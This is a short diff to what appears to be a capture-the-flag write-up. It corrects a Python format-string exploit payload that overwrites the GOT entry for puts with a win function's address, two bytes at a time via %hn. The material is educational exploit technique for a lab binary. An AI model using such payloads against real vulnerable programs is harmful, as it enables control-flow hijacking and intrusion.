@@ -28,10 +28,10 @@ puts_address = elf.got['puts']
 
 Then, we can write the address two bytes at a time using the following payload:
 ```py
-win_low = (win & 0xffff) - 8  # - 8 bytes due to the two p32 addresses in the payload (each one is 4 bytes)
-win_high = (win >> 16) - win_low
+win_high = ((win >> 16) & 0xffff) - 8
+win_low = (win & 0xffff) - win_high - 8
 
-payload =  p32(puts_address) + p32(puts_address + 2) + f"%{win_low}x%7$hn".encode() + f"%{win_high}%8$hn".encode()
+payload =  p32(puts_address + 2) + p32(puts_address) + (f'%{win_high}x%7$hn').encode() + (f'%{win_low}x%8$hn').encode()
 ```
 
 Then, we send the payload and we get the flag.
